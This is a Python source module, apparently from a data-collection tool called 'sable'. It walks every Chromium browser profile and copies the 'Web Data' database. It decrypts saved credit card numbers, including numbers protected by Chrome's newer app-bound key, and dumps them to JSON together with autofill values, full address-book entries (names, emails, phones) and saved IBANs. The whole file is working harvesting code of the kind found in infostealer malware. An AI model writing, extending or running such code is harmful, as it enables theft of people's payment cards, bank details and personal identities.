"""Chromium autofill, payment cards, addresses and IBANs.

``Web Data`` carries four separate things and each gets its own artifact:

- ``autofill`` — the field/value pairs the browser offers when you click a form.
- ``credit_cards`` — card numbers, encrypted with the same key chain as passwords.
- ``autofill_profiles`` plus the name, email and phone child tables — the address
  book, joined on ``guid``.
- ``local_ibans`` — saved bank identifiers, stored unencrypted.

Card numbers on a Chrome 127+ profile are ``v20`` and need the app-bound key, so the
key is resolved once per profile and every row goes through the same prefix switch
``chromium`` uses. A card that will not decrypt is skipped, never emitted blank with
the ciphertext missing, because an empty number reads as a card with no digits.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any, Final

from .. import util
from .browsers import chromium, chromium_roots, profile_dirs, slug

_MAX_FIELDS: Final[int] = 2000
_MAX_CARDS: Final[int] = 200
_MAX_ADDRESSES: Final[int] = 200
_MAX_IBANS: Final[int] = 200
_MAX_CHILDREN: Final[int] = 1000

_WANTED_FIELDS: Final[tuple[str, ...]] = ("name", "value", "count", "date_last_used")

_WANTED_CARDS: Final[tuple[str, ...]] = (
    "guid",
    "name_on_card",
    "expiration_month",
    "expiration_year",
    "card_number_encrypted",
    "nickname",
)

_WANTED_PROFILES: Final[tuple[str, ...]] = (
    "guid",
    "company_name",
    "street_address",
    "city",
    "state",
    "zipcode",
    "country_code",
    "use_count",
)

_WANTED_NAMES: Final[tuple[str, ...]] = ("guid", "first_name", "middle_name", "last_name")
_WANTED_EMAILS: Final[tuple[str, ...]] = ("guid", "email")
_WANTED_PHONES: Final[tuple[str, ...]] = ("guid", "number")
_WANTED_IBANS: Final[tuple[str, ...]] = ("guid", "nickname", "value")


def _group(rows: list[dict[str, Any]], field: str) -> dict[str, list[dict[str, Any]]]:
    """Rows grouped by a string key. Rows with no key are dropped."""
    grouped: dict[str, list[dict[str, Any]]] = {}
    for row in rows:
        key = chromium.text_value(row[field])
        if not key:
            continue
        if key in grouped:
            grouped[key].append(row)
        else:
            grouped[key] = [row]
    return grouped


def _fields(copy: Path, target: Path) -> int:
    rows = chromium.read_table(
        copy, "autofill", _WANTED_FIELDS, _MAX_FIELDS, "date_last_used DESC"
    )
    entries: list[dict[str, Any]] = []

    for row in rows:
        name = chromium.text_value(row["name"])
        value = chromium.text_value(row["value"])
        if not name and not value:
            continue
        entries.append(
            {
                "name": name,
                "value": value,
                "count": chromium.int_value(row["count"]),
            }
        )

    if not entries:
        return 0
    if not util.write_json(target / "autofill.json", entries):
        return 0
    return len(entries)


def _cards(copy: Path, target: Path, keys: chromium.Keys) -> int:
    rows = chromium.read_table(copy, "credit_cards", _WANTED_CARDS, _MAX_CARDS)
    entries: list[dict[str, Any]] = []

    for row in rows:
        secret = chromium.secret_value(row["card_number_encrypted"], keys, b"")
        if secret is None:
            continue
        number = secret.decode("utf-8", "replace").strip("\x00 ")
        if not number:
            continue
        entries.append(
            {
                "number": number,
                "name": chromium.text_value(row["name_on_card"]),
                "month": chromium.int_value(row["expiration_month"]),
                "year": chromium.int_value(row["expiration_year"]),
                "nickname": chromium.text_value(row["nickname"]),
                "guid": chromium.text_value(row["guid"]),
            }
        )

    if not entries:
        return 0
    if not util.write_json(target / "cards.json", entries):
        return 0
    return len(entries)


def _addresses(copy: Path, target: Path) -> int:
    rows = chromium.read_table(copy, "autofill_profiles", _WANTED_PROFILES, _MAX_ADDRESSES)
    if not rows:
        return 0

    names = _group(
        chromium.read_table(copy, "autofill_profile_names", _WANTED_NAMES, _MAX_CHILDREN),
        "guid",
    )
    emails = _group(
        chromium.read_table(copy, "autofill_profile_emails", _WANTED_EMAILS, _MAX_CHILDREN),
        "guid",
    )
    phones = _group(
        chromium.read_table(copy, "autofill_profile_phones", _WANTED_PHONES, _MAX_CHILDREN),
        "guid",
    )

    entries: list[dict[str, Any]] = []

    for row in rows:
        guid = chromium.text_value(row["guid"])
        entry: dict[str, Any] = {
            "guid": guid,
            "company": chromium.text_value(row["company_name"]),
            "street": chromium.text_value(row["street_address"]),
            "city": chromium.text_value(row["city"]),
            "state": chromium.text_value(row["state"]),
            "zip": chromium.text_value(row["zipcode"]),
            "country": chromium.text_value(row["country_code"]),
            "used": chromium.int_value(row["use_count"]),
        }

        if guid in names:
            entry["names"] = [
                {
                    "first": chromium.text_value(item["first_name"]),
                    "middle": chromium.text_value(item["middle_name"]),
                    "last": chromium.text_value(item["last_name"]),
                }
                for item in names[guid]
            ]
        if guid in emails:
            entry["emails"] = [chromium.text_value(item["email"]) for item in emails[guid]]
        if guid in phones:
            entry["phones"] = [chromium.text_value(item["number"]) for item in phones[guid]]

        entries.append(entry)

    if not entries:
        return 0
    if not util.write_json(target / "addresses.json", entries):
        return 0
    return len(entries)


def _ibans(copy: Path, target: Path) -> int:
    rows = chromium.read_table(copy, "local_ibans", _WANTED_IBANS, _MAX_IBANS)
    entries: list[dict[str, Any]] = []

    for row in rows:
        value = chromium.text_value(row["value"])
        if not value:
            continue
        entries.append(
            {
                "value": value,
                "nickname": chromium.text_value(row["nickname"]),
                "guid": chromium.text_value(row["guid"]),
            }
        )

    if not entries:
        return 0
    if not util.write_json(target / "ibans.json", entries):
        return 0
    return len(entries)


def _profile(profile: Path, browser: str, out_dir: Path) -> int:
    source = profile / "Web Data"
    if not source.is_file():
        return 0

    target = out_dir / browser / slug(profile.name)
    written = 0

    with util.temp_workspace("sable-autofill-") as scratch:
        copy = chromium.copy_database(source, scratch)
        if copy is None:
            return 0

        keys = chromium.profile_keys(profile)
        written += _fields(copy, target)
        written += _cards(copy, target, keys)
        written += _addresses(copy, target)
        written += _ibans(copy, target)

    return written


def run(out_dir: Path, cfg: Any) -> int:
    """Collect autofill, cards, addresses and IBANs. Returns items written."""
    total = 0

    for root in chromium_roots():
        if not root.path.is_dir():
            continue
        dirs = [root.path] if root.profile_is_root else profile_dirs(root.path)
        for profile in dirs:
            total += _profile(profile, root.name, out_dir)

    return total


__all__ = ["run"]
